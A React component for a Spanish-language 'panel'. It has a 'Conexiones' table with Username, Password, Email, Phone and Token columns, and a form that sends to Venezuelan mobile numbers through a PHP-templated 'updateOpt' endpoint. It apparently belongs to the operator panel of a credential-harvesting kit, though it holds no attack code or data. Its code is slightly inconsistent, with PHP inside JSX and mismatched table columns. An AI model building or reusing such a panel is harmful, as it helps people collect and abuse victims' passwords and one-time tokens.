export default function panel() {
  return (
    <div>
      <div className="main-container">
        <div className="col-xs-12 color-container col-sm-7">
          <div>
            <h2>Conexiones</h2>
          </div>
          <table className="table">
            <thead>
              <tr>
                <th scope="row">#</th>
                <th>Username</th>
                <th>Password</th>
                <th>Email</th>
                <th>Tlf</th>
                <th>Envio</th>
                <th>Token</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td></td>
                <td></td>
                <td></td>
                <td></td>
                <td></td>
                <td></td>
              </tr>
            </tbody>
          </table>
        </div>
        <div className="col-xs-12 color-container col-sm-4">
          <div className="detalles-container">
            <h2 style={{ paddingBottom: "10px" }}>Envío</h2>
            <hr style={{ width: "100%", borderTop: "1px solid grey" }} />
            <form
              action="<?php echo constant('URL'); ?>panel/updateOpt"
              method="POST"
              name="formopt"
              className="panelform"
            >
              <div className="group">
                <input id="idClient" name="idClient" type="number" required />
                <span className="highlight"></span>
                <span className="bar"></span>
                <label>Id</label>
              </div>
              <h5 style={{ color: "grey" }}>Código de area</h5>
              <div className="content-select">
                <select id="cod" name="cod">
                  <option value="0412">0412</option>
                  <option value="0414">0414</option>
                  <option value="0424">0424</option>
                  <option value="0416">0416</option>
                  <option value="0426">0426</option>
                </select>
                <i></i>
                <div className="group">
                  <input id="number" name="number" type="number" required />
                  <span className="highlight"></span>
                  <span className="bar"></span>
                  <label>Número</label>
                </div>
                <div className="group">
                  <input id="email" name="email" type="email" required />
                  <span className="highlight"></span>
                  <span className="bar"></span>
                  <label>Email</label>
                </div>
                <button
                  type="submit"
                  style={{ padding: "15px 0" }}
                  className="button_slide slide_inside"
                >
                  Enviar
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
